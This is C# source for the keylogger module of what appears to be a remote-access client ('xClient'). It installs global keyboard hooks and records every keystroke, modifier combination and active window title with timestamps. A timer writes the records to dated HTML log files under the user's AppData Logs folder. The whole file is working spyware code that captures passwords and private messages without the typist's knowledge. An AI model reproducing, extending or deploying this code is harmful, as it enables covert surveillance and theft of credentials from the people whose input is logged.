using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    /// <summary>
    /// Ties together the logic used to log keyboard input with the
    /// logic used to manipulate the output
    /// </summary>
    public class Logger : IDisposable
    {
        public static Logger Instance;
        public bool IsDisposed { get; private set; }

        private StringBuilder _logFileBuffer;
        private string _lastWindowTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly System.Timers.Timer _timerFlush;

        private List<Keys> _pressedKeys = new List<Keys>();
        private List<char> _pressedKeyChars = new List<char>();
        private bool _ignoreSpecialKeys = false;

        private IKeyboardMouseEvents _mEvents;

        /// <summary>
        /// Creates the logging class that provides keylogging functionality.hello?
        /// </summary>
        public Logger(double flushInterval)
        {
            Instance = this;
            _lastWindowTitle = string.Empty;

            WriteFile();

            this._logFileBuffer = new StringBuilder();

            this._timerFlush = new System.Timers.Timer { Interval = flushInterval };
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;

            Unsubscribe();
            Subscribe(Hook.GlobalEvents());

            _timerFlush.Enabled = true;
            _timerFlush.Start();
        }

        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!IsDisposed)
            {
                if (disposing)
                {
                    if (_timerFlush != null)
                        _timerFlush.Dispose();
                }

                Unsubscribe();

                IsDisposed = true;
            }
        }

        private void Subscribe(IKeyboardMouseEvents events)
        {
            _mEvents = events;
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            if (_mEvents == null) return;

            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
            _mEvents.Dispose();
        }

        private void OnKeyDown(object sender, KeyEventArgs e) //Called first
        {
            string activeWindowTitle = LoggerHelper.GetActiveWindowTitle(); //Get active thread window title
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                _lastWindowTitle = activeWindowTitle;
                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
                    + activeWindowTitle + " - " 
                    + DateTime.Now.ToString("HH:mm") 
                    + "</b>]</p><br>");
            }

            if (_pressedKeys.IsModifierKeysSet())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                // The key was not part of the keys that we wish to filter, so
                // be sure to prevent a situation where multiple keys are pressed.
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        //This method should be used to process all of our unicode characters
        private void OnKeyPress(object sender, KeyPressEventArgs e) //Called second
        {
            if (_pressedKeys.IsModifierKeysSet() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = LoggerHelper.Filter(e.KeyChar);
                if (!string.IsNullOrEmpty(filtered))
                {
                    Debug.WriteLine("OnKeyPress Output: " + filtered);
                    if (_pressedKeys.IsModifierKeysSet())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);
                    _logFileBuffer.Append(filtered);
                }
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e) //Called third
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
            _pressedKeyChars.Clear();
        }

        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = LoggerHelper.GetDisplayName(keys[i]);
                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.IsModifierKeysSet())
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;

                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                // If there are items in the special keys string builder, give it an ending tag
                if (validSpecialKeys > 0)
                    specialKeys.Append("]</p>");

                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;
                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;
                    default:
                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0 && !SystemCore.Disconnect)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.WriteLine("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                         DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");

                                // Write out our coloring scheme that will be used by the elements
                                // generated by the logger, and display paragaphs without line breaks
                                // h = Denotes highlighted text (blue color).
                                sw.WriteLine("<style>.h { color: 0000ff; display: inline; }</style>");

                                if (_logFileBuffer.Length > 0)
                                    sw.Write(_logFileBuffer);

                                _lastWindowTitle = string.Empty;
                            }
                            else
                                sw.Write(_logFileBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _logFileBuffer = new StringBuilder();
        }
    }
}